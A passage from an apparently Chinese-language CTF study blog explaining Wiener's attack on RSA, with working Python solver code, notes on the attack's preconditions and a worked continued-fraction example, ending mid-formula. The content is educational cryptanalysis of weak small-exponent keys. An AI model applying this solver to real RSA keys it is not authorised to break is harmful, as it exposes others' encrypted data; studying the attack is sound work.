    res <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span>cf<span class="token punctuation">,</span> <span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>i<span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 将连分数的结果逐一截取以求渐进分数</span>
    <span class="token keyword">return</span> res


<span class="token keyword">def</span> <span class="token function">get_pq</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 由p+q和pq的值通过维达定理来求解p和q(解二元一次方程)</span>
    par <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>isqrt<span class="token punctuation">(</span>b <span class="token operator">*</span> b <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">*</span> a <span class="token operator">*</span> c<span class="token punctuation">)</span>  <span class="token comment"># 由上述可得，开根号一定是整数，因为有解</span>
    x1<span class="token punctuation">,</span> x2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">-</span>b <span class="token operator">+</span> par<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> a<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token operator">-</span>b <span class="token operator">-</span> par<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> a<span class="token punctuation">)</span>
    <span class="token keyword">return</span> x1<span class="token punctuation">,</span> x2


<span class="token keyword">def</span> <span class="token function">wienerAttack</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>d<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">in</span> list_fraction<span class="token punctuation">(</span>e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 用一个for循环来注意试探e/n的连续函数的渐进分数，直到找到一个满足条件的渐进分数</span>
        <span class="token keyword">if</span> k <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># 可能会出现连分数的第一个为0的情况，排除</span>
            <span class="token keyword">continue</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>e <span class="token operator">*</span> d <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> k <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># ed=1 (mod φ(n)) 因此如果找到了d的话，(ed-1)会整除φ(n),也就是存在k使得(e*d-1)//k=φ(n)</span>
            <span class="token keyword">continue</span>

        phi <span class="token operator">=</span> <span class="token punctuation">(</span>e <span class="token operator">*</span> d <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> k  <span class="token comment"># 这个结果就是 φ(n)</span>
       
        px<span class="token punctuation">,</span> qy <span class="token operator">=</span> get_pq<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n <span class="token operator">-</span> phi <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>

        <span class="token keyword">if</span> px <span class="token operator">*</span> qy <span class="token operator">==</span> n<span class="token punctuation">:</span>
            p<span class="token punctuation">,</span> q <span class="token operator">=</span> <span class="token builtin">abs</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>px<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">abs</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>qy<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 可能会得到两个负数，负负得正未尝不会出现</span>
            d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 求ed=1 (mod  φ(n))的结果，也就是e关于 φ(n)的乘法逆元d</span>
            <span class="token keyword">return</span> d
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"求解d失败"</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
e <span class="token operator">=</span> <span class="token number">8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825</span>
n <span class="token operator">=</span> <span class="token number">19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433</span>
d <span class="token operator">=</span> wienerAttack<span class="token punctuation">(</span>e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>
c <span class="token operator">=</span> <span class="token number">6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248</span>
m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> 
<hr> 
<p>Wiener攻击学习：</p> 
<p>需要学习连分数相关知识 Michael J.Wiener的论文</p> 
<p>参考：https://cryptohack.gitbook.io/cryptobook/untitled/low-private-component-attacks/wieners-attack</p> 
<p>使用wiener攻击的前提条件</p> 
<ul><li>d相比于n足够小 满足范围 d &lt; <span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml"> 
       
        
         
          
          
            1 
           
          
            3 
           
          
          
          
            n 
           
          
            4 
           
          
         
        
          \frac{1}{3}\sqrt[4]{n} 
         
        
      </span><span class="katex-html"><span class="base"><span class="strut" style="height: 2.0074em; vertical-align: -0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.3214em;"><span class="" style="top: -2.314em;"><span class="pstrut" style="height: 3em;"></span><span class="mord"><span class="mord">3</span></span></span><span class="" style="top: -3.23em;"><span class="pstrut" style="height: 3em;"></span><span class="frac-line" style="border-bottom-width: 0.04em;"></span></span><span class="" style="top: -3.677em;"><span class="pstrut" style="height: 3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.686em;"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord sqrt"><span class="root"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.7172em;"><span class="" style="top: -2.895em;"><span class="pstrut" style="height: 2.5em;"></span><span class="sizing reset-size6 size1 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.8492em;"><span class="svg-align" style="top: -3em;"><span class="pstrut" style="height: 3em;"></span><span class="mord" style="padding-left: 0.833em;"><span class="mord mathnormal">n</span></span></span><span class="" style="top: -2.8092em;"><span class="pstrut" style="height: 3em;"></span><span class="hide-tail" style="min-width: 0.853em; height: 1.08em;"> 
             <svg width="400em" height="1.08em" viewbox="0 0 400000 1080" preserveaspectratio="xMinYMin slice"> 
              <path d="M95,702
c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14
c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54
c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10
s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429
c69,-144,104.5,-217.7,106.5,-221
l0 -0
c5.3,-9.3,12,-14,20,-14
H400000v40H845.2724
s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7
c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z
M834 80h400000v40h-400000z"></path> 
             </svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.1908em;"><span class=""></span></span></span></span></span></span></span></span></span></span></li><li>q &lt; p &lt; 2q</li><li>e &lt; phi(n)</li></ul> 
<p><img src="https://images2.imgbox.com/34/90/8HRiT0ZW_o.png" alt="image-20231002122440641"></p> 
<p>获得d的原理：</p> 
<p><img src="https://images2.imgbox.com/d5/5a/hPHHfxtN_o.png" alt="image-20231002122541594"></p> 
<p>ed = 1 mod phi(n)</p> 
<p>即有 ed = k phi(n) + 1</p> 
<p>又因为phi(n) = (p-1)(q-1) = pq - (p+q) + 1 约等于 pq = n</p> 
<p>此外在ed式子中1所占值太小 可以忽略</p> 
<p>即有<code>ed = kn</code> =&gt; <span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml"> 
      
       
        
         
         
           e 
          
         
           n 
          
         
        
          = 
         
         
         
           k 
          
         
           d 
          
         
        
       
         \frac{e}{n}=\frac{k}{d} 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1.7936em; vertical-align: -0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.1076em;"><span class="" style="top: -2.314em;"><span class="pstrut" style="height: 3em;"></span><span class="mord"><span class="mord mathnormal">n</span></span></span><span class="" style="top: -3.23em;"><span class="pstrut" style="height: 3em;"></span><span class="frac-line" style="border-bottom-width: 0.04em;"></span></span><span class="" style="top: -3.677em;"><span class="pstrut" style="height: 3em;"></span><span class="mord"><span class="mord mathnormal">e</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.686em;"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right: 0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.2778em;"></span></span><span class="base"><span class="strut" style="height: 2.0574em; vertical-align: -0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.3714em;"><span class="" style="top: -2.314em;"><span class="pstrut" style="height: 3em;"></span><span class="mord"><span class="mord mathnormal">d</span></span></span><span class="" style="top: -3.23em;"><span class="pstrut" style="height: 3em;"></span><span class="frac-line" style="border-bottom-width: 0.04em;"></span></span><span class="" style="top: -3.677em;"><span class="pstrut" style="height: 3em;"></span><span class="mord"><span style="margin-right: 0.0315em;" class="mord mathnormal">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.686em;"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></span></p> 
<p>因为e和n已知 利用连分数的展开方法去尝试爆破d的值</p> 
<p>那么连分数又是什么 又该如何获得连分数呢？</p> 
<p>🌰</p> 
<p>首先我们对==<span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml"> 
      
       
        
         
         
           43 
          
         
           19 
          
         
        
       
         \frac{43}{19} 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 2.0074em; vertical-align: -0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.3214em;"><span class="" style="top: -2.314em;"><span class="pstrut" style="height: 3em;"></span><span class="mord"><span class="mord">19</span></span></span><span class="" style="top: -3.23em;"><span class="pstrut" style="height: 3em;"></span><span class="frac-line" style="border-bottom-width: 0.04em;"></span></span><span class="" style="top: -3.677em;"><span class="pstrut" style="height: 3em;"></span><span class="mord"><span class="mord">43</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.686em;"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></span>==进行连分数展开</p> 
<ul><li><span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml"> 
       
        
         
          
          
            43 
           
          
            19 
           
          
         
        
          \frac{43}{19} 
         
        
      </span><span class="katex-html"><span class="base"><span class="strut" style="height: 2.0074em; vertical-align: -0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.3214em;"><span class="" style="top: -2.314em;"><span class="pstrut" style="height: 3em;"></span><span class="mord"><span class="mord">19</span></span></span><span class="" style="top: -3.23em;"><span class="pstrut" style="height: 3em;"></span><span class="frac-line" style="border-bottom-width: 0.04em;"></span></span><span class="" style="top: -3.677em;"><span class="pstrut" style="height: 3em;"></span><span class="mord"><span class="mord">43</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.686em;"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></span> = 2 + <span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml"> 
       
        
         
          
          
            5 
           
          
            19 
           
          
         
        
          \frac{5}{19} 
         
        
      </span><span class="katex-html"><span class="base"><span class="strut" style="height: 2.0074em; vertical-align: -0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.3214em;"><span class="" style="top: -2.314em;"><span class="pstrut" style="height: 3em;"></span><span class="mord"><span class="mord">19</span></span></span><span class="" style="top: -3.23em;"><span class="pstrut" style="height: 3em;"></span><span class="frac-line" style="border-bottom-width: 0.04em;"></span></span><span class="" style="top: -3.677em;"><span class="pstrut" style="height: 3em;"></span><span class="mord"><span class="mord">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.686em;"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></span></li></ul> 
<p>需要把分数部分的分子转化为1</p> 
<ul><li><span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml"> 
       
        
         
          
          
            43 
           
          
            19 
           
          
         
        
          \frac{43}{19} 
         
        
      </span><span class="katex-html"><span class="base"><span class="strut" style="height: 2.0074em; vertical-align: -0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.3214em;"><span class="" style="top: -2.314em;"><span class="pstrut" style="height: 3em;"></span><span class="mord"><span class="mord">19</span></span></span><span class="" style="top: -3.23em;"><span class="pstrut" style="height: 3em;"></span><span class="frac-line" style="border-bottom-width: 0.04em;"></span></span><span class="" style="top: -3.677em;"><span class="pstrut" style="height: 3em;"></span><span class="mord"><span class="mord">43</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.686em;"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></span> = 2 + <span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml"> 
       
        
         
          
          
            1 
           
           
           
             19 
            
           
             5 
            
           
          
         
        
          \frac{1}{\frac{19}{5}} 
         
        
      </span><span class="katex-html"><span class="base"><span class="strut" style="height: 2.4015em; vertical-align: -1.0801em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.3214em;"><span class="" style="top: -2.2649em;"><span class="pstrut" style="height: 3em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.8451em;"><span class="" style="top: -2.655em;"><span class="pstrut" style="height: 3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span></span></span></span><span class="" style="top: -3.23em;"><span class="pstrut" style="height: 3em;"></span><span class="frac-line" style="border-bottom-width: 0.04em;"></span></span><span class="" style="top: -3.394em;"><span class="pstrut" style="height: 3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">19</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.345em;"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span class="" style="top: -3.23em;"><span class="pstrut" style="height: 3em;"></span><span class="frac-line" style="border-bottom-width: 0.04em;"></span></span><span class="" style="top: -3.677em;"><span class="pstrut" style="height: 3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 1.0801em;"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></span> = 2 + <span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml"> 
       
        
         
          
          
            1 
           
           
           
             3 
            
           
             + 
            
            
            
              4 
             
            
              5 
             
            
           
          
         
        
          \frac{1}{3+\frac{4}{5}} 
         
        
      </span><span class="katex-html"><span class="base"><span class="strut" style="height: 2.4015em; vertical-align: -1.0801em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.3214em;"><span class="" style="top: -2.2649em;"><span class="pstrut" style="height: 3em;"></span><span class="mord"><span class="mord">3</span><span class="mspace" style="margin-right: 0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.2222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.8451em;"><span class="" style="top: -2.655em;"><span class="pstrut" style="height: 3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span></span></span></span><span class="" style="top: -3.23em;"><span class="pstrut" style="height: 3em;"></span><span class="frac-line" style="border-bottom-width: 0.04em;"></span></span><span class="" style="top: -3.394em;"><span class="pstrut" style="height: 3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.345em;"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span class="" style="top: -3.23em;"><span class="pstrut" style="height: 3em;"></span><span class="frac-line" style="border-bottom-width: 0.04em;"></span></span><span class="" style="top: -3.677em;"><span class="pstrut" style="height: 3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 1.0801em;"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></span> = 2 + <span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml"> 
       
        
         
          
          
            1 
           
           
           
             3 
            
           
             + 
            
            
            
              1 
             
             
             
               5 
              
             
               4 
              
             
            
           
          
         
        
          \frac{1}{3+\frac{1}{\frac{5}{4}}} 
         
        
      </span><span class="katex-html"><span class="base"><span class="strut" style="height: 2.6984em; vertical-align: -1.3769em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.3214em;"><span class="" style="top: -2.2649em;"><span class="pstrut" style="height: 3em;"></span><span class="mord"><span class="mord">3</span><span class="mspace" style="margin-right: 0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.2222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.8451em;"><span class="" style="top: -2.599em;"><span class="pstrut" style="height: 3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.8443em;"><span class="" style="top: -2.656em;"><span class="pstrut" style="height: 3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span><span class="" style="top: -3.2255em;"><span class="pstrut" style="height: 3em;"></span><span class="frac-line mtight" style="border-bottom-width: 0.049em;"></span></span><span class="" style="top: -3.384em;"><span class="pstrut" style="height: 3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.344em;"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span></span></span></span><span class="" style="top: -3.23em;"><span class="pstrut" style="height: 3em;"></span><span class="frac-line" style="border-bottom-width: 0.04em;"></span></span><span class="" style="top: -3.394em;"><span class="pstrut" style="height: 3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.6418em;"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span class="" style="top: -3.23em;"><span class="pstrut" style="height: 3em;"></span><span class="frac-line" style="border-bottom-width: 0.04em;"></span></span><span class="" style="top: -3.677em;"><span class="pstrut" style="height: 3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 1.3769em;"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></span> = 2 + <span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml"> 
       
        
         
          
          
            1 
           
           
           
             3 
            
           
             + 
            
            
            
              1 
             
             
             
               1 
              
             
               + 
              
              
              
                1 
               
              
                4 
               
              
             
            
           
          
         
        
          \frac{1}{3+\frac{1}{1+\frac{1}{4}}} 
         
        
      </span><span class="katex-html"><span class="base"><span class="strut" style="height: 2.6984em; vertical-align: -1.3769em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.3214em;"><span class="" style="top: -2.2649em;"><span class="pstrut" style="height: 3em;"></span><span class="mord"><span class="mord">3</span><span class="mspace" style="margin-right: 0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.2222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.8451em;"><span class="" style="top: -2.599em;"><span class="pstrut" style="height: 3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mbin mtight">+</span><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.8443em;"><span class="" style="top: -2.656em;"><span class="pstrut" style="height: 3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span><span class="" style="top: -3.2255em;"><span class="pstrut" style="height: 3em;"></span><span class="frac-line mtight" style="border-bottom-width: 0.049em;"></span></span><span class="" style="top: -3.384em;"><span class="pstrut" style="height: 3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.344em;"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span></span></span></span><span class="" style="top: -3.23em;"><span class="pstrut" style="height: 3em;"></span><span class="frac-line" style="border-bottom-width: 0.04em;"></span></span><span class="" style="top: -3.394em;"><span class="pstrut" style="height: 3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.6418em;"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span class="" style="top: -3.23em;"><span class="pstrut" style="height: 3em;"></span><span class="frac-line" style="border-bottom-width: 0.04em;"></span></span><span class="" style="top: -3.677em;"><span class="pstrut" style="height: 3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 1.3769em;"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></span></li></ul> 
<p>如果对<span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml"> 
      
       
        
         
         
           1 
          
         
           4 
          
         
        
       
         \frac{1}{4} 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 2.0074em; vertical-align: -0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.3214em;"><span class="" style="top: -2.314em;"><span class="pstrut" style="height: 3em;"></span><span class="mord"><span class="mord">4</span></span></span><span class="" style="top: -3.23em;"><span class="pstrut" style="height: 3em;"></span><span class="frac-line" style="border-bottom-width: 0.04em;"></span></span><span class="" style="top: -3.677em;"><span class="pstrut" style="height: 3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.686em;"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></span> 再进行转化的话余数为0 所以展开到此结束</p> 
<p>那么如此繁琐的算法 我们解题的时候肯定不能手算吧 所以一种方法是上面我们自己写代码实现这种算法 基于欧几里得思想 遇到余数为0停止</p> 
<p>另一种稍微简单的方法是直接使用sagemath 因为这里面的函数自带解连分数的功能</p> 
<p>🌰</p> 
<pre><code class="prism language-python"><span class="token comment">#sage</span>
e<span class="token operator">=</span><span class="token number">43</span>
n<span class="token operator">=</span><span class="token number">19</span>
cf <span class="token operator">=</span> continued_fraction<span class="token punctuation">(</span>e<span class="token operator">/</span>n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>cf<span class="token punctuation">)</span>
convergents <span class="token operator">=</span> cf<span class="token punctuation">.</span>convergents<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>convergents<span class="token punctuation">)</span>
<span class="token comment">#[2; 3, 1, 4]</span>
<span class="token comment">#[2, 7/3, 9/4, 43/19]</span>
</code></pre> 
<p>转换为分数的形式 每一次都是抛弃套娃的最后一次计算 比如第二次就是为 2 + <span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml"> 
      
       
        
         
         
           1 
          
         
           3 
          
         
        
       
         \frac{1}{3} 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 2.0074em; vertical-align: -0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.3214em;"><span class="" style="top: -2.314em;"><span class="pstrut" style="height: 3em;"></span><span class="mord"><span class="mord">3</span></span></span><span class="" style="top: -3.23em;"><span class="pstrut" style="height: 3em;"></span><span class="frac-line" style="border-bottom-width: 0.04em;"></span></span><span class="" style="top: -3.677em;"><span class="pstrut" style="height: 3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.686em;"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></span> = <span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml"> 
      
       
        
         
         
           7 
          
         
           3 
          
         
        
       
         \frac{7}{3} 
        
       
